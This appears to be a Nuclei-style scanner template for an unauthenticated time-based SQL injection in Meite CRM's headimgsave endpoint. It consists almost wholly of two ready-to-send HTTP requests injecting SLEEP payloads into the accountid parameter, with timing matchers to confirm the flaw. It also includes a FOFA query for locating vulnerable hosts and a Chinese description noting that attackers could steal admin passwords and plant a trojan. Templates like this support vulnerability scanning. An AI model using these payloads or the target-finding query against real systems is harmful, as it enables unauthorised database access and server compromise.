http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(4))x)--+ HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        - |
          GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(8))x)--+ HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
id: meiteCRM-headimgsave-sql-time
info:
    author: Superhero
    description: |-
        fofa: body="/common/scripts/basic.js"
        美特CRM headimgsave 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 美特CRM headimgsave SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/ZVO8GZkZVJYDfCr7i1p3Rw
    severity: high
    tags:
        - 美特CRM
